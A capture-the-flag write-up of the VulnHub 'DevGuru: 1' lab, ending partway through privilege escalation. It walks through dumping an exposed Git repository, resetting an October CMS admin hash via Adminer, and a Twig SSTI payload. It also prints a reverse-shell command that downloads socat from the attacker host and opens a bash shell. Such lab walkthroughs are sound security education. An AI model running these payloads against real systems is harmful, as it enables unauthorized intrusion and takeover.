# DevGuru: 1

## Introduction

Welcome to my another writeup! In this VulnHub [DevGuru: 1](https://www.vulnhub.com/entry/devguru-1,620/) box, you'll learn: Dumping Git repository from a website, enumerating and modifying database's data in Adminer, exploiting authenticated SSTI in October CMS and authenticated RCE in Gitea version 1.12.5, bypassing `sudo` policy blacklist via CVE-2019-14287, privilege escalation via misconfigurated Sudo permission in `sqlite3`, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: qiu to root](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

DevGuru is a fictional web development company hiring you for a pentest assessment. You have been tasked with finding vulnerabilities on their corporate website and obtaining root.

OSCP like ~ Real life based

Difficulty: Intermediate (Depends on experience)

## Service Enumeration

**Host discovery:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|14:42:15(HKT)]
└> sudo netdiscover -r 10.69.96.0/24
[...]
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                          
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.69.96.1      00:50:56:c0:00:08      1      60  VMware, Inc.                                           
 10.69.96.2      00:50:56:ef:bb:e8      1      60  VMware, Inc.                                           
 10.69.96.75     00:0c:29:af:e6:87      1      60  VMware, Inc.                                           
 10.69.96.200    00:50:56:ee:65:6a      1      60  VMware, Inc.
```

- Target machine IP address: `10.69.96.75`
- Attacker machine IP address: `10.69.96.100`

**Create 2 environment variables for future use:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|14:42:53(HKT)]
└> export RHOSTS=10.69.96.75
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|14:42:55(HKT)]
└> export LHOST=`ifconfig eth0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|14:43:05(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN scanning/rustscan.txt
[...]
Open 10.69.96.75:22
Open 10.69.96.75:80
Open 10.69.96.75:8585
[...]
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+lft/kQdC+3L4qMerPmpboe5GOrB60x+QU0R7hjmxY+9bNqST//1+Oa7ycVotqdlk4EtxgnqE2B4mRTNb16mITv/Y8UfsCqYAuy3C8lV9HzG6zgsXgnAhvpMmY31fZqz+dKamnp1W1o+scbnzRNqr/fE1+Yz7Fcu4JvAJ/4NLQS9CHmZh+N12OyF8eVOQmjPeRVHR8BiptinM+EXis4xpOQiuZoEBPkyqhXcBW65CAXlkjuuJ6KpJ7Y3Gbse38L6LKGFs8Hl5k1jbuTxDg8CT+rzzy6on8niDDfcVwHTvZ1JqlUpzjaGifDD8gV60ebRa5/36ORI+ed6G9v1HOW3r
|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQzBnXE0Ezf7XOzh2KxdMAetOtoTEmfiCh2OSwjnIpAzd1osDr7UsuNt/5m45OgfWVAcVnu3ECEuQZ03P4VxkU=
|   256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINjsvy3HYYZxlENx0Fmval1Ax8ApGBKu6wf5sjK8xuv2
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Corp - DevGuru
| http-git: 
|   10.69.96.75:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: first commit 
|     Remotes:
|       http://devguru.local:8585/frank/devguru-website.git
|_    Project type: PHP application (guessed from .gitignore)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: DevGuru
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8585/tcp open  unknown syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
[...]
|     <title> Gitea: Git with a cup of tea </title>
[...]
[...]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|14:43:07(HKT)]
└> sudo nmap -sU $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
```

According to `rustscan` and `nmap` result, the target machine has 3 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|22/TCP            | OpenSSH 7.6p1 Ubuntu          |
|80/TCP            | Apache httpd 2.4.29 ((Ubuntu))|
|8585/TCP          | HTTP (Gitea)                  |

### HTTP on TCP port 80

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818144354.png)

In here, we can see that there's a domain called `devguru.local`.

- Found domain: `devguru.local`

**Adding that domain to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|14:46:05(HKT)]
└> echo "$RHOSTS devguru.local" | sudo tee -a /etc/hosts
10.69.96.75 devguru.local
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818144942.png)

In the footer, there's a copy right statement, and this web application is a HTML template made by [Themefisher](https://themefisher.com/).

**We can also perform content discovery via tools like `gobuster` to find hidden directories and files:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|14:49:04(HKT)]
└> gobuster dir -u http://devguru.local/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
[...]
/themes               (Status: 301) [Size: 315] [--> http://devguru.local/themes/]
/config               (Status: 301) [Size: 315] [--> http://devguru.local/config/]
/about                (Status: 200) [Size: 18661]
/services             (Status: 200) [Size: 10032]
/backend              (Status: 302) [Size: 410] [--> http://devguru.local/backend/backend/auth]
/plugins              (Status: 301) [Size: 316] [--> http://devguru.local/plugins/]
/Services             (Status: 200) [Size: 10032]
/modules              (Status: 301) [Size: 316] [--> http://devguru.local/modules/]
/storage              (Status: 301) [Size: 316] [--> http://devguru.local/storage/]
/0                    (Status: 200) [Size: 12669]
/vendor               (Status: 301) [Size: 315] [--> http://devguru.local/vendor/]
/About                (Status: 200) [Size: 18661]
/ABOUT                (Status: 200) [Size: 18661]
[...]
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|15:03:39(HKT)]
└> gobuster dir -u http://devguru.local/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 10
[...]
/index.php            (Status: 200) [Size: 12719]
/.htaccess            (Status: 200) [Size: 1678]
/server.php           (Status: 200) [Size: 0]
/.git                 (Status: 301) [Size: 313] [--> http://devguru.local/.git/]
/.gitignore           (Status: 200) [Size: 413]
```

**`/backend/backend/auth`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818145323.png)

When we go there, it redirects us to `/backend/backend/auth/sigin`.

Upon researching, the web application seems like using a CMS (Content Management System) called "**October CMS**".

We also found `/.git/` Git repository in both `gobuster` and `nmap` result. Which means the web application is using **version control**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818150634.png)

However, `/.git/` has no index listing.

**Luckily, we can dump the Git repository via [git-dumper](https://github.com/arthaud/git-dumper):**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|15:08:57(HKT)]
└> mkdir git_dumped
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|15:09:00(HKT)]
└> git-dumper http://devguru.local/.git git_dumped 
[-] Testing http://devguru.local/.git/HEAD [200]
[-] Testing http://devguru.local/.git/ [404]
[-] Fetching common files
[...]
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|15:10:00(HKT)]
└> cd git_dumped 
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1/git_dumped)-[2023.08.18|15:10:12(HKT)]-[git://master ✔]
└> ls -lah           
total 416K
drwxr-xr-x 9 siunam nam 4.0K Aug 18 15:09 .
drwxr-xr-x 4 siunam nam 4.0K Aug 18 15:08 ..
-rw-r--r-- 1 siunam nam 355K Aug 18 15:09 adminer.php
-rw-r--r-- 1 siunam nam 1.7K Aug 18 15:09 artisan
drwxr-xr-x 2 siunam nam 4.0K Aug 18 15:09 bootstrap
drwxr-xr-x 2 siunam nam 4.0K Aug 18 15:09 config
drwxr-xr-x 7 siunam nam 4.0K Aug 18 15:09 .git
-rw-r--r-- 1 siunam nam  413 Aug 18 15:09 .gitignore
-rw-r--r-- 1 siunam nam 1.7K Aug 18 15:09 .htaccess
-rw-r--r-- 1 siunam nam 1.2K Aug 18 15:09 index.php
drwxr-xr-x 5 siunam nam 4.0K Aug 18 15:09 modules
drwxr-xr-x 3 siunam nam 4.0K Aug 18 15:09 plugins
-rw-r--r-- 1 siunam nam 1.5K Aug 18 15:09 README.md
-rw-r--r-- 1 siunam nam  551 Aug 18 15:09 server.php
drwxr-xr-x 6 siunam nam 4.0K Aug 18 15:09 storage
drwxr-xr-x 4 siunam nam 4.0K Aug 18 15:09 themes
```

Nice!

**After some digging, the October CMS's database credentials can be found in `config/database.php`:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1/git_dumped)-[2023.08.18|15:10:58(HKT)]-[git://master ✔]
└> cat config/database.php
[...]
        'mysql' => [
            'driver'     => 'mysql',
            'engine'     => 'InnoDB',
            'host'       => 'localhost',
            'port'       => 3306,
            'database'   => 'octoberdb',
            'username'   => 'october',
            'password'   => '{Redacted}',
            'charset'    => 'utf8mb4',
            'collation'  => 'utf8mb4_unicode_ci',
            'prefix'     => '',
            'varcharmax' => 191,
        ],
[...]
```

**Let's view the repository's commit logs:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1/git_dumped)-[2023.08.18|15:14:17(HKT)]-[git://master ✔]
└> git log   
commit 7de9115700c5656c670b34987c6fbffd39d90cf2 (HEAD -> master, origin/master)
Author: frank <frank@devguru.local>
Date:   Thu Nov 19 18:42:03 2020 -0600

    first commit
```

Hmm... It only has 1 commit. Also, we found **a user called `frank`**.

**Check October CMS version:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1/git_dumped)-[2023.08.18|15:17:49(HKT)]-[git://master ✔]
└> cat storage/system.json | jq .
{
  "build": 469
}
```

- October CMS version: **Build 469**

After searching about this build version, I found no vulnerability against it.

We can try to login as `frank` in the October CMS using the database user's password:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818152334.png)

Nope...

### HTTP on TCP port 8585

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818152143.png)

In here, we found TCP port 8585 is hosting the **Gitea service, and its version is 1.12.5**.

> Gitea is a lightweight DevOps platform. It brings teams and developers high-efficiency but easy operations from planning to production. (From [https://about.gitea.com/](https://about.gitea.com/))

**We can search for public exploits about this version of Gitea via `searchsploit`, an offline version of Exploit-DB:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|15:22:07(HKT)]
└> searchsploit gitea 1.12.5
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Gitea 1.12.5 - Remote Code Execution (Authenticated)                 | multiple/webapps/49571.py
--------------------------------------------------------------------- ---------------------------------
[...]
```

Oh! It's vulnerable to RCE (Remote Code Execution), however, it requires authentication, which means we need valid credentials.

**In the "Explore" page's users section, we can find a Gitea user:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818152239.png)

- Found Gitea user: `frank`

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818152258.png)

In this user, it has no **public** repository.

I also tried to login as `frank` with the October CMS database user's password, but no dice.

Hmm... Can we register a new account?

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818152358.png)

No we can't...

Let's take a step back.

**After digging much deeper on the dumped Git repository, I found an October CMS session in `storage/framework/sessions/`:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1/git_dumped)-[2023.08.18|15:44:48(HKT)]-[git://master ✔]
└> cat storage/framework/sessions/fE15ry9gija5yG3n2dnCiBEplMWBFP53zsKRRNAh 
a:8:{s:6:"_token";s:40:"eZHozMsXJwcKYK5lTi4HNUBaVy0UHhLMrzaBiLD6";s:9:"_previous";a:1:{s:3:"url";s:20:"http://devguru.local";}s:6:"_flash";a:2:{s:3:"old";a:0:{}s:3:"new";a:0:{}}s:3:"url";a:0:{}s:10:"admin_auth";a:2:{i:0;i:1;i:1;s:60:"$2y$10${Redacted}";}s:6:"locale";s:2:"en";s:15:"fallback_locale";s:2:"en";s:6:"widget";a:6:{s:31:"cms-Index-TemplateList-pageList";s:100:"YToyOntzOjg6InNlbGVjdGVkIjthOjA6e31zOjE0OiJncm91cHNidXNpbmVzcyI7YToxOntzOjQ6ImJsb2ciO3M6MToiMSI7fX0=";s:34:"cms-Index-TemplateList-partialList";s:1044:"YToyOntzOjg6InNlbGVjdGVkIjthOjE5OntzOjE3OiJibG9nL2Jsb2dQb3N0Lmh0bSI7czoxOiIwIjtzOjE5OiJibG9nL2NhdGVnb3JpZXMuaHRtIjtzOjE6IjAiO3M6MTQ6ImJsb2cvcG9zdHMuaHRtIjtzOjE6IjAiO3M6MjM6ImdlbmVyaWNGb3JtL2RlZmF1bHQuaHRtIjtzOjE6IjAiO3M6MjU6ImdlbmVyaWNGb3JtL3JlY2FwdGNoYS5odG0iO3M6MToiMCI7czoxNDoiaG9tZS9hYm91dC5odG0iO3M6MToiMCI7czoyMDoiaG9tZS9jb250YWN0aG9tZS5odG0iO3M6MToiMCI7czoxNjoiaG9tZS9jb3VudGVyLmh0bSI7czoxOiIwIjtzOjEyOiJob21lL2N0YS5odG0iO3M6MToiMCI7czoxNDoiaG9tZS9pbnRyby5odG0iO3M6MToiMCI7czoxNzoiaG9tZS9zZXJ2aWNlcy5odG0iO3M6MToiMCI7czoxNToiaG9tZS9zbGlkZXIuaHRtIjtzOjE6IjAiO3M6MjA6ImhvbWUvdGVzdGltb25pYWwuaHRtIjtzOjE6IjAiO3M6MjQ6InNpdGUvYmxvZ2ludHJvaGVhZGVyLmh0bSI7czoxOiIwIjtzOjI5OiJzaXRlL2Jsb2dzaW5nbGVwb3N0aGVhZGVyLmh0bSI7czoxOiIwIjtzOjE1OiJzaXRlL2Zvb3Rlci5odG0iO3M6MToiMCI7czoxNToic2l0ZS9oZWFkZXIuaHRtIjtzOjE6IjAiO3M6MTM6InNpdGUvbWV0YS5odG0iO3M6MToiMCI7czoxNjoic2l0ZS9zY3JpcHRzLmh0bSI7czoxOiIwIjt9czoxNDoiZ3JvdXBzYnVzaW5lc3MiO2E6NDp7czo0OiJob21lIjtzOjE6IjEiO3M6NDoiYmxvZyI7czoxOiIxIjtzOjExOiJnZW5lcmljRm9ybSI7czoxOiIxIjtzOjQ6InNpdGUiO3M6MToiMSI7fX0=";s:33:"cms-Index-TemplateList-layoutList";s:36:"YToxOntzOjg6InNlbGVjdGVkIjthOjA6e319";s:34:"cms-Index-TemplateList-contentList";s:36:"YToxOntzOjg6InNlbGVjdGVkIjthOjA6e319";s:31:"backend-Users-Filter-listFilter";s:40:"YToxOntzOjEzOiJzY29wZS1yb2xlX2lkIjtOO30=";s:19:"backend-Users-Lists";s:44:"YToxOntzOjE1OiJsYXN0VmlzaXRlZFBhZ2UiO2k6MTt9";}}
```

Based on my experience, the above session file is a **PHP serialized object**.  

**We can deserialize it:**
```php
<?php
$sessionObject = 'a:8:{s:6:"_token";s:40:"eZHozMsXJwcKYK5lTi4HNUBaVy0UHhLMrzaBiLD6";s:9:"_previous";a:1:{s:3:"url";s:20:"http://devguru.local";}s:6:"_flash";a:2:{s:3:"old";a:0:{}s:3:"new";a:0:{}}s:3:"url";a:0:{}s:10:"admin_auth";a:2:{i:0;i:1;i:1;s:60:"$2y$10${Redacted}";}s:6:"locale";s:2:"en";s:15:"fallback_locale";s:2:"en";s:6:"widget";a:6:{s:31:"cms-Index-TemplateList-pageList";s:100:"YToyOntzOjg6InNlbGVjdGVkIjthOjA6e31zOjE0OiJncm91cHNidXNpbmVzcyI7YToxOntzOjQ6ImJsb2ciO3M6MToiMSI7fX0=";s:34:"cms-Index-TemplateList-partialList";s:1044:"YToyOntzOjg6InNlbGVjdGVkIjthOjE5OntzOjE3OiJibG9nL2Jsb2dQb3N0Lmh0bSI7czoxOiIwIjtzOjE5OiJibG9nL2NhdGVnb3JpZXMuaHRtIjtzOjE6IjAiO3M6MTQ6ImJsb2cvcG9zdHMuaHRtIjtzOjE6IjAiO3M6MjM6ImdlbmVyaWNGb3JtL2RlZmF1bHQuaHRtIjtzOjE6IjAiO3M6MjU6ImdlbmVyaWNGb3JtL3JlY2FwdGNoYS5odG0iO3M6MToiMCI7czoxNDoiaG9tZS9hYm91dC5odG0iO3M6MToiMCI7czoyMDoiaG9tZS9jb250YWN0aG9tZS5odG0iO3M6MToiMCI7czoxNjoiaG9tZS9jb3VudGVyLmh0bSI7czoxOiIwIjtzOjEyOiJob21lL2N0YS5odG0iO3M6MToiMCI7czoxNDoiaG9tZS9pbnRyby5odG0iO3M6MToiMCI7czoxNzoiaG9tZS9zZXJ2aWNlcy5odG0iO3M6MToiMCI7czoxNToiaG9tZS9zbGlkZXIuaHRtIjtzOjE6IjAiO3M6MjA6ImhvbWUvdGVzdGltb25pYWwuaHRtIjtzOjE6IjAiO3M6MjQ6InNpdGUvYmxvZ2ludHJvaGVhZGVyLmh0bSI7czoxOiIwIjtzOjI5OiJzaXRlL2Jsb2dzaW5nbGVwb3N0aGVhZGVyLmh0bSI7czoxOiIwIjtzOjE1OiJzaXRlL2Zvb3Rlci5odG0iO3M6MToiMCI7czoxNToic2l0ZS9oZWFkZXIuaHRtIjtzOjE6IjAiO3M6MTM6InNpdGUvbWV0YS5odG0iO3M6MToiMCI7czoxNjoic2l0ZS9zY3JpcHRzLmh0bSI7czoxOiIwIjt9czoxNDoiZ3JvdXBzYnVzaW5lc3MiO2E6NDp7czo0OiJob21lIjtzOjE6IjEiO3M6NDoiYmxvZyI7czoxOiIxIjtzOjExOiJnZW5lcmljRm9ybSI7czoxOiIxIjtzOjQ6InNpdGUiO3M6MToiMSI7fX0=";s:33:"cms-Index-TemplateList-layoutList";s:36:"YToxOntzOjg6InNlbGVjdGVkIjthOjA6e319";s:34:"cms-Index-TemplateList-contentList";s:36:"YToxOntzOjg6InNlbGVjdGVkIjthOjA6e319";s:31:"backend-Users-Filter-listFilter";s:40:"YToxOntzOjEzOiJzY29wZS1yb2xlX2lkIjtOO30=";s:19:"backend-Users-Lists";s:44:"YToxOntzOjE1OiJsYXN0VmlzaXRlZFBhZ2UiO2k6MTt9";}}';

var_dump(unserialize($sessionObject));
?>
```

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|15:42:24(HKT)]
└> php deserialize.php
array(8) {
  ["_token"]=>
  string(40) "eZHozMsXJwcKYK5lTi4HNUBaVy0UHhLMrzaBiLD6"
  ["_previous"]=>
  array(1) {
    ["url"]=>
    string(20) "http://devguru.local"
  }
  ["_flash"]=>
  array(2) {
    ["old"]=>
    array(0) {
    }
    ["new"]=>
    array(0) {
    }
  }
  ["url"]=>
  array(0) {
  }
  ["admin_auth"]=>
  array(2) {
    [0]=>
    int(1)
    [1]=>
    string(60) "$2y$10${Redacted}"
  }
  ["locale"]=>
[...]
```

Oh! What's that `admin_auth` attribute's value? It seems like a password hash. However, I couldn't crack it.

**Then, I found that there's a PHP script called `adminer.php`:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1/git_dumped)-[2023.08.18|16:04:53(HKT)]-[git://master ✔]
└> head -n 5 adminer.php
<?php
/** Adminer - Compact database management
* @link https://www.adminer.org/
* @author Jakub Vrana, https://www.vrana.cz/
* @copyright 2007 Jakub Vrana
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818160547.png)

> Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to [phpMyAdmin](https://www.phpmyadmin.net/), it consist of a single file ready to deploy to the target server. Adminer is available for **MySQL**, **MariaDB**, **PostgreSQL**, **SQLite**, **MS SQL**, **Oracle**, **Elasticsearch**, **MongoDB** and others via plugin. (From [https://www.adminer.org/](https://www.adminer.org/))

## Initial Foothold

**Now, we can try to login as October CMS's database user `october`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818160654.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818160701.png)

It worked! Let's enumerate the database!

**Go to database `octoberdb`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818161127.png)

Among those tables, table `backend_users` seems like holding all users' information.

**Select table `backend_users`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818161211.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818161242.png)

Found user `frank`'s password hash!

**But, it's unable to crack:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|16:08:24(HKT)]
└> nano frank_october_cms.hash
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|16:08:29(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt frank_october_cms.hash 
[...]
0g 0:00:02:19 0.13% (ETA: 2023-08-19 21:35) 0g/s 162.5p/s 162.5c/s 162.5C/s muggle..friends6
```

**Luckily, we can just modify the password hash to login as user `frank` on October CMS!**

- Generate bcrypt password hash:

```php
<?php
echo password_hash("password", PASSWORD_DEFAULT);
?>
```

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|16:21:47(HKT)]
└> php gen_password.php 
$2y$10$O5I0hiyePdikvoUwYzQtMOEK3emjotqjxWXjZCpo15b3AuC53nCuS
```

- Modify the password hash in Adminer:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818162240.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818162259.png)

**Now we should be able to login as user `frank`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818162328.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818162343.png)

We're in!

**After enumerating, I found that we can edit Twig templates in `/backend/cms`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818163023.png)

> Twig is **a modern template engine for PHP.** It also has a sandbox mode, which makes SSTI (Server-Side Template Injection) much harder. (From [https://twig.symfony.com/](https://twig.symfony.com/))

**According to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig---code-execution), we can get RCE via Twig SSTI payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818163111.png)

**After some trial and error, this payload works:**
```twig
{{[0]|reduce('system','id')}}
```

- Modify the `/about` template:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818163159.png)

- View the result in `/about`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818163210.png)

**Nice! Let's get a reverse shell!**

- Setup a socat listener: (For fully interactive shell)

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|16:32:51(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/08/18 16:32:52 socat[275576] N opening character device "/dev/pts/1" for reading and writing
2023/08/18 16:32:52 socat[275576] N listening on AF=2 0.0.0.0:443
```

- Host the `socat` binary via Python's `http.server` module:

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|16:33:21(HKT)]
└> file /opt/static-binaries/binaries/linux/x86_64/socat
/opt/static-binaries/binaries/linux/x86_64/socat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|16:33:22(HKT)]
└> python3 -m http.server -d /opt/static-binaries/binaries/linux/x86_64/ 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Modify the template with the following Twig SSTI payload: (Generated from [revshells.com](https://www.revshells.com/))

```twig
{{[0]|reduce('system','wget http://10.69.96.100/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:10.69.96.100:443 EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane')}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/DevGuru:1/images/Pasted%20image%2020230818163654.png)

- Trigger the reverse shell payload:

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|16:36:39(HKT)]
└> curl http://devguru.local/about

```

- Profit:

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/DevGuru:1)-[2023.08.18|16:32:51(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/08/18 16:32:52 socat[275576] N opening character device "/dev/pts/1" for reading and writing
2023/08/18 16:32:52 socat[275576] N listening on AF=2 0.0.0.0:443
                                                                 2023/08/18 16:36:39 socat[275576] N accepting connection from AF=2 10.69.96.75:38068 on AF=2 10.69.96.100:443
                                                                   2023/08/18 16:36:39 socat[275576] N starting data transfer loop with FDs [5,5] and [7,7]
                                                www-data@devguru:/var/www/html$ 
www-data@devguru:/var/www/html$ export TERM=xterm-256color
www-data@devguru:/var/www/html$ stty rows 22 columns 107
www-data@devguru:/var/www/html$ ^C
www-data@devguru:/var/www/html$ whoami; hostname; id; ip a
www-data
devguru.local
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:af:e6:87 brd ff:ff:ff:ff:ff:ff
    inet 10.69.96.75/24 brd 10.69.96.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:feaf:e687/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `www-data`!

## Privilege Escalation

### www-data to frank

After gaining initial foothold of a target machine, we need to escalate our privilege. To do so, we need to enumerate the system.

**Find system users:**
```shell
www-data@devguru:/var/www/html$ awk -F':' '{ if ($3 >= 1000 && $3 <= 60000) { print $1 } }' /etc/passwd
frank
www-data@devguru:/var/www/html$ ls -lah /home
total 12K
drwxr-xr-x  3 root  root  4.0K Nov 18  2020 .
drwxr-xr-x 25 root  root  4.0K Nov 19  2020 ..
drwxr-x---  7 frank frank 4.0K Nov 19  2020 frank
```

- System user: `frank`

**Found unusual `app.ini.bak` file in `/var/backups/` directory:**
```shell
www-data@devguru:/var/www/html$ ls -lah /var/backups/
total 76K
drwxr-xr-x  2 root  root  4.0K Aug 18  2023 .
drwxr-xr-x 13 root  root  4.0K Nov 19  2020 ..
-rw-r--r--  1 frank frank  56K Nov 19  2020 app.ini.bak
-rw-r--r--  1 root  root  5.6K Nov 19  2020 apt.extended_states.0
-rw-r--r--  1 root  root   719 Nov 18  2020 apt.extended_states.1.gz
```

**`/var/backups/app.ini.bak`:**
```conf
; This file lists the default values used by Gitea
; Copy required sections to your own app.ini (default is custom/conf/app.ini)
; and modify as needed.
; see https://docs.gitea.io/en-us/config-cheat-sheet/ for additional documentation.
[...]
RUN_USER = frank
[...]
[database]
